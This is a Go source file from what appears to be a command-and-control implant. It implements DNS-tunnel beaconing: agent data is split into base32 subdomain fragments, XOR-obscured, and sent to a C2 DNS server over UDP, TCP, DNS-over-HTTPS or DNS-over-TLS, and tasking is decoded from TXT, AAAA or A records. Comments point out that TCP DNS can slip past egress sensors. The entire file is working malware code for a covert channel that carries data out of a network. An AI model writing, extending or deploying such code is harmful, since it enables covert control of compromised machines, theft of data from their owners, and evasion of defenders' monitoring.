//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"bytes"
	"context"
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"time"
)

// sendDNSBeacon performs a DNS TXT-based C2 beacon.
// It builds one or more queries with the agent UUID, fragment metadata and
// base32-encoded JSON request fragments in the subdomain, sends them to the C2
// DNS server, and reads the response. Requests larger than one DNS qname can
// carry are split into fragments, each below the 253-character qname limit.
// Supports UDP, DNS-over-TCP (RFC 1035), DNS-over-HTTPS (DoH), and
// DNS-over-TLS (DoT) based on config. The response record type (TXT, AAAA or A)
// is selected by the DNSIPv6 / DNSARecordTunnel flags; the server picks the
// matching tunnel automatically from the query type.
func sendDNSBeacon(body []byte) []byte {
	domain := DNSDomain
	if domain == "" {
		return nil
	}
	dnsServer := DNSServer
	if dnsServer == "" {
		return nil
	}

	// Build the query names: <hex-uuid>[.<total_index>.<base32data>...].dns.<domain>
	uuidHex := hexEncodedUUID(agentUUID)
	queries := buildDNSQueryNames(uuidHex, body)

	// Determine DNS transport: DoH > DoT > TCP > UDP
	dohURL := DNSDoHURL
	dotAddr := DNSDoTAddr

	var lastResp []byte
	for i, qname := range queries {
		var resp []byte
		switch {
		case dohURL != "":
			resp = sendDNSDoH(dohURL, qname)
		case dotAddr != "":
			resp = sendDNSDoT(dotAddr, qname)
		case DNSTCP:
			resp = sendDNSTCP(dnsServer, qname)
		default:
			resp = sendDNSUDP(dnsServer, qname)
		}
		if i == len(queries)-1 {
			// Only the final fragment carries the full response; intermediate
			// queries are acknowledged with a blank record which parses to nil.
			lastResp = resp
		}
	}

	// Reverse the response-side XOR obscuring (keyed by the agent UUID, which
	// the server derives from the same qname label) so the encrypted envelope
	// is recovered unchanged.
	if DNSObscure && len(lastResp) > 0 {
		lastResp = xorBytes(lastResp, dnsObfuscateKey(uuidHex))
	}
	return lastResp
}

// dnsObfuscateKey derives the deterministic XOR key used to obscure DNS
// fragments and responses. It is keyed by the agent UUID so the server — which
// learns the UUID from the unobscured qname label — can apply the identical
// transform without a pre-shared side channel.
func dnsObfuscateKey(agentID string) []byte {
	if agentID == "" {
		return []byte("forgec2")
	}
	return []byte(agentID)
}

// xorBytes applies a repeating-key XOR. It is its own inverse.
func xorBytes(data, key []byte) []byte {
	if len(key) == 0 {
		return data
	}
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key[i%len(key)]
	}
	return out
}

// dnsQueryType returns the request/response record type for this agent's DNS
// profile: A-record tunneling (1) when DNSARecordTunnel is set, AAAA (28) when
// DNSIPv6 is set, otherwise TXT (16).
func dnsQueryType() uint16 {
	switch {
	case DNSARecordTunnel:
		return 1
	case DNSIPv6:
		return 28
	default:
		return 16
	}
}

// dnsFragmentMaxBody is the maximum plaintext bytes per DNS fragment. 57 bytes
// encode to ≤ 92 base32 characters, which fits in two 63-char DNS labels and
// keeps the assembled qname well below the 253-character limit for any
// realistic domain.
const dnsFragmentMaxBody = 57

// buildDNSQueryNames splits body into base32 fragments and returns one DNS
// query name per fragment. Each name is guaranteed to stay under the DNS
// 253-character qname cap so recursive resolvers accept it.
func buildDNSQueryNames(uuidHex string, body []byte) []string {
	if len(body) == 0 {
		return []string{uuidHex + ".dns." + DNSDomain}
	}
	total := (len(body) + dnsFragmentMaxBody - 1) / dnsFragmentMaxBody
	names := make([]string, 0, total)
	for i := 0; i < total; i++ {
		start := i * dnsFragmentMaxBody
		end := start + dnsFragmentMaxBody
		if end > len(body) {
			end = len(body)
		}
		frag := body[start:end]
		if DNSObscure {
			frag = xorBytes(frag, dnsObfuscateKey(uuidHex))
		}
		encoded := base32.StdEncoding.EncodeToString(frag)
		encoded = strings.TrimRight(encoded, "=")
		meta := fmt.Sprintf("%d_%d", total, i)
		labels := []string{uuidHex, meta}
		for j := 0; j < len(encoded); j += 63 {
			e := j + 63
			if e > len(encoded) {
				e = len(encoded)
			}
			labels = append(labels, encoded[j:e])
		}
		names = append(names, strings.Join(labels, ".")+".dns."+DNSDomain)
	}
	return names
}

// sendDNSUDP sends a DNS query via plain UDP.
func sendDNSUDP(dnsServer, qname string) []byte {
	qtype := dnsQueryType()
	pkt := buildDNSQuery(qname, qtype)

	conn, err := net.DialTimeout("udp", dnsServer+":53", 5*time.Second)
	if err != nil {
		if Debug {
			fmt.Printf("[!] DNS UDP dial failed: %v\n", err)
		}
		return nil
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(10 * time.Second))
	if _, err := conn.Write(pkt); err != nil {
		return nil
	}

	resp := make([]byte, 4096)
	n, err := conn.Read(resp)
	if err != nil {
		return nil
	}

	return parseDNSResponse(resp[:n], qtype)
}

// sendDNSDoH sends a DNS query via DNS-over-HTTPS (RFC 8484).
func sendDNSDoH(dohURL, qname string) []byte {
	qtype := dnsQueryType()
	pkt := buildDNSQuery(qname, qtype)

	req, err := http.NewRequest("POST", dohURL, bytes.NewReader(pkt))
	if err != nil {
		return nil
	}
	req.Header.Set("Content-Type", "application/dns-message")
	req.Header.Set("Accept", "application/dns-message")

	resp, err := client.Do(req)
	if err != nil {
		if Debug {
			fmt.Printf("[!] DNS DoH request failed: %v\n", err)
		}
		return nil
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil
	}

	body, err := io.ReadAll(io.LimitReader(resp.Body, 16*1024*1024))
	if err != nil {
		return nil
	}

	return parseDNSResponse(body, qtype)
}

// sendDNSDoT sends a DNS query via DNS-over-TLS (RFC 7858).
func sendDNSDoT(dotAddr, qname string) []byte {
	qtype := dnsQueryType()
	pkt := buildDNSQuery(qname, qtype)

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	conn, err := utlsDialContext(ctx, "tcp", dotAddr)
	if err != nil {
		if Debug {
			fmt.Printf("[!] DNS DoT dial failed: %v\n", err)
		}
		return nil
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(10 * time.Second))
	// DNS over TCP: 2-byte length prefix
	tcpPkt := make([]byte, 2+len(pkt))
	binary.BigEndian.PutUint16(tcpPkt[:2], uint16(len(pkt)))
	copy(tcpPkt[2:], pkt)

	if _, err := conn.Write(tcpPkt); err != nil {
		return nil
	}

	// Read response: 2-byte length prefix + response
	var respLen uint16
	if err := binary.Read(conn, binary.BigEndian, &respLen); err != nil {
		return nil
	}
	if respLen == 0 || respLen > 4096 {
		return nil
	}
	respBody := make([]byte, respLen)
	if _, err := io.ReadFull(conn, respBody); err != nil {
		return nil
	}

	return parseDNSResponse(respBody, qtype)
}

// sendDNSTCP sends a DNS query over a plain TCP connection (RFC 1035
// length-prefix framing). Some egress sensors only inspect UDP DNS, so TCP can
// slip past them; it is also required when a single query/response exceeds the
// 512-byte UDP datagram limit.
func sendDNSTCP(dnsServer, qname string) []byte {
	qtype := dnsQueryType()
	pkt := buildDNSQuery(qname, qtype)

	conn, err := net.DialTimeout("tcp", dnsServer+":53", 5*time.Second)
	if err != nil {
		if Debug {
			fmt.Printf("[!] DNS TCP dial failed: %v\n", err)
		}
		return nil
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(10 * time.Second))
	tcpPkt := make([]byte, 2+len(pkt))
	binary.BigEndian.PutUint16(tcpPkt[:2], uint16(len(pkt)))
	copy(tcpPkt[2:], pkt)

	if _, err := conn.Write(tcpPkt); err != nil {
		return nil
	}

	var respLen uint16
	if err := binary.Read(conn, binary.BigEndian, &respLen); err != nil {
		return nil
	}
	if respLen == 0 || respLen > 65535 {
		return nil
	}
	respBody := make([]byte, respLen)
	if _, err := io.ReadFull(conn, respBody); err != nil {
		return nil
	}

	return parseDNSResponse(respBody, qtype)
}

// hexEncodedUUID converts UUID with dashes to a hex-only string
func hexEncodedUUID(uuid string) string {
	return strings.ReplaceAll(uuid, "-", "")
}

// buildDNSQuery builds a raw DNS query packet for the given domain name and qtype.
func buildDNSQuery(name string, qtype uint16) []byte {
	encoded := encodeDNSName(name)

	// Header (12 bytes)
	hdr := make([]byte, 12)
	// ID (random)
	binary.BigEndian.PutUint16(hdr[0:2], uint16(rng.Uint32()))
	// Flags: standard query, recursion desired
	binary.BigEndian.PutUint16(hdr[2:4], 0x0100)
	// QDCOUNT = 1
	binary.BigEndian.PutUint16(hdr[4:6], 1)
	// ANCOUNT = 0
	binary.BigEndian.PutUint16(hdr[6:8], 0)
	// NSCOUNT = 0
	binary.BigEndian.PutUint16(hdr[8:10], 0)
	// ARCOUNT = 0
	binary.BigEndian.PutUint16(hdr[10:12], 0)

	// Question
	q := encoded
	// QTYPE
	q = append(q, byte(qtype>>8), byte(qtype))
	// QCLASS: IN = 1
	q = append(q, 0, 1)

	return append(hdr, q...)
}

// encodeDNSName encodes a domain name in DNS label format.
func encodeDNSName(name string) []byte {
	var buf []byte
	labels := strings.Split(name, ".")
	for _, label := range labels {
		if len(label) == 0 {
			continue
		}
		buf = append(buf, byte(len(label)))
		buf = append(buf, []byte(label)...)
	}
	buf = append(buf, 0) // root label
	return buf
}

// parseDNSResponse parses a DNS response packet for TXT (16) or AAAA (28) records.
func parseDNSResponse(pkt []byte, qtype uint16) []byte {
	if len(pkt) < 12 {
		return nil
	}

	ancount := binary.BigEndian.Uint16(pkt[6:8])
	offset := 12

	// Skip question section
	for offset < len(pkt) {
		if pkt[offset] == 0 {
			offset++
			break
		}
		if pkt[offset]&0xC0 == 0xC0 {
			offset += 2
			break
		}
		offset += int(pkt[offset]) + 1
	}
	offset += 4 // skip QTYPE + QCLASS

	if offset > len(pkt) {
		return nil
	}

	var txts []string
	for i := 0; i < int(ancount) && offset < len(pkt); i++ {
		if offset+2 > len(pkt) {
			break
		}
		if pkt[offset]&0xC0 == 0xC0 {
			offset += 2
		} else {
			for offset < len(pkt) && pkt[offset] != 0 {
				offset += int(pkt[offset]) + 1
			}
			offset++
		}

		if offset+10 > len(pkt) {
			break
		}
		rtype := binary.BigEndian.Uint16(pkt[offset : offset+2])
		offset += 2
		offset += 2 // CLASS
		offset += 4 // TTL
		rdlength := binary.BigEndian.Uint16(pkt[offset : offset+2])
		offset += 2

		if rtype == 16 { // TXT
			end := offset + int(rdlength)
			if end > len(pkt) {
				end = len(pkt)
			}
			pos := offset
			for pos < end {
				if pos >= len(pkt) {
					break
				}
				txtLen := int(pkt[pos])
				pos++
				if pos+txtLen > len(pkt) {
					break
				}
				txts = append(txts, string(pkt[pos:pos+txtLen]))
				pos += txtLen
			}
		} else if rtype == 28 { // AAAA (IPv6)
			// AAAA tunneling packs the base64 payload into 16-byte rdata
			// chunks (ASCII text), not a real IPv6 address. Append the raw
			// bytes as a base64 chunk so the concatenated string decodes.
			if rdlength > 0 && offset+int(rdlength) <= len(pkt) {
				txts = append(txts, string(pkt[offset:offset+int(rdlength)]))
			}
		} else if rtype == 1 { // A — A-record tunneling packs the base64 payload into 4-byte rdata chunks.
			if rdlength == 4 && offset+4 <= len(pkt) {
				txts = append(txts, string(pkt[offset:offset+4]))
			}
		}
		offset += int(rdlength)
	}

	if len(txts) == 0 {
		return nil
	}

	combined := strings.Join(txts, "")
	combined = strings.TrimSpace(combined)
	if combined == "" || combined == " " {
		return nil
	}

	data, err := base64.StdEncoding.DecodeString(combined)
	if err != nil {
		if Debug {
			fmt.Printf("[!] DNS base64 decode failed: %v\n", err)
		}
		return nil
	}
	return data
}
